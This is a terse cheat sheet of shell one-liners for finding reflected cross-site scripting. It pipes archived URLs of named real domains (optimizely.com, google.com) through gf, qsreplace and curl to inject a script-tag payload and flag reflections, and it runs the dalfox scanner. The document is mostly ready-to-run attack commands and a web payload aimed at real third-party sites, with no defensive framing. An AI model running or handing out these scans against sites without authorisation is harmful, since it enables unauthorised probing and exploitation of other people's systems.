OneLiner 
-> `waybackurls www.optimizely.com | gf xss  | qsreplace '"><script>alert()</script>' | while read host; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>alert()" && echo -e "$host \033[0;33mVulnerable\033[0m"; done `
-> `waybackurls domain.com | tee -a target.txt | grep "="`  --> best way 


--> filter unnecessary -> `waybackurls domain.com | grep "="  | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)"




1) dalfox -> `dalfox url https://google.com`
2) 